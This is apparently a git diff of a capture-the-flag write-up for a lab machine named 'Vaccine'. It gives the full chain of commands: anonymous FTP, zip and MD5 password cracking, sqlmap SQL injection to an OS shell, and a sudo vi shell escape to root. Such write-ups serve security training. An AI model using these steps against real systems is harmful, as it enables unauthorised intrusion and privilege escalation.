@@ -3,6 +3,10 @@ layout: default
 title: Vaccine
 ---
 
+## TL;DR
+
+First we login anonymously to `ftp` server, and grab the backup file. From this we get the has of admin password and crack it. Then, after login to portal, we use `SQL Injection` to get reverse shell using `sqlmap`. We escalate to root using `vi`, known PE exploit.
+
 ### Recon
 
 first we starts with `nmap`, using this command:
@@ -13,7 +17,7 @@ nmap -p- -sVC --min-rate=10000 $target
 ![nmap](image.png)
 
 As we can see, there are 3 open ports, port `21` for ftp, port `22` for ssh, and port `80` for http.
-```
+```bash
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -46,7 +50,8 @@ PORT   STATE SERVICE VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### Login annonymosuly to ftp
+### Login anonymously to ftp
+
 We can see we can login anonymously to ftp, and download the `backup.zip` from there, using the `get` command.
 ```bash
 ftp anonymous@$target
@@ -55,6 +60,7 @@ ftp anonymous@$target
 ![download backup.zip](image-1.png)
 
 ### Extract files from backup.zip
+
 When we try to unzip `backup.zip` using the command `unzip backup.zip`, we can see it asks for a password. 
 Let's try to crack it using *john the ripper*.
 
@@ -62,10 +68,13 @@ First, we need to transfroms it from `zip` to `hash`, using the command:
 ```bash
 zip2john backup.zip > hashes
 ```
+
 Then, we can crack it using john:
+
 ```bash
 john hashes
 ```
+
 At the end, we can reveal the password using the flag `--show`, like in *hashcat*.
 The password is `741852963`.
 
@@ -84,17 +93,18 @@ We can use `hashcat` to crack the password, the `-m 0` flag is to specify the ha
 hashcat -a 0 -m 0 2cb42f8734ea607eefed3b70af13bbd3 -O  /usr/share/wordlists/rockyou.txt
 ``` 
 And we get the password:
-```
+```bash
 2cb42f8734ea607eefed3b70af13bbd3:qwerty789
 ```
 
 So, let's login:
+
 ![logged in](image-4.png)
 
 ### Using Sql Injection to get shell
 
 When we give the search this value `'` we get error, this line:
-```
+```bash
 ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
 ```
 using `sqlmap` we can see it is vulnerable to sql injection. We can use the `--os-shell` flag to get shell over the machine, this is the command, we use `--batch` to avoid all the questions. Don't forget to supply your cookie, you need to be authenticated as an admin.
@@ -138,11 +148,11 @@ postgres@vaccine:/var/www/html$ cat dashboard.php
   <meta charset="UTF-8">
   <title>Admin Dashboard</title>
 
-...
+<REDACTED>
 
 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
-
 ```
+
 alright, the password for the user `postgres` is `P@s5w0rd!`, we can use it to connect via `ssh`, as we saw in the beginning that port `22` is open:
 ```bash
 ssh postgres@$target
@@ -151,9 +161,10 @@ ssh postgres@$target
 ### Escalate privilege
 
 After connecting via `ssh`, we start looking for PE. First, we'll check for commands we can run as an root, using:
-```
+```bash
 sudo -l
 ```
+
 ![sudo -l](image-5.png)
 
 As we can see, we can execute only one command as root:
@@ -167,12 +178,12 @@ Okay, so let's run this command:
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
 
-We can go to GTFobins, to this link https://gtfobins.github.io/gtfobins/vi/#sudo, and see this:
+We can go to GTFobins, to this link [https://gtfobins.github.io/gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo), and see this:
 ```
 It can be used to break out from restricted environments by spawning an interactive system shell.
 ```
 
-```
+```bash
 :set shell=/bin/sh
 :shell
 ```
@@ -180,7 +191,7 @@ It can be used to break out from restricted environments by spawning an interact
 Let's execute those commands, inside the `vi`, 
 we managed to spawn a shell as root, :) 
 
-``` 
+```sh
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # find / -name "root.txt" 2>/dev/null
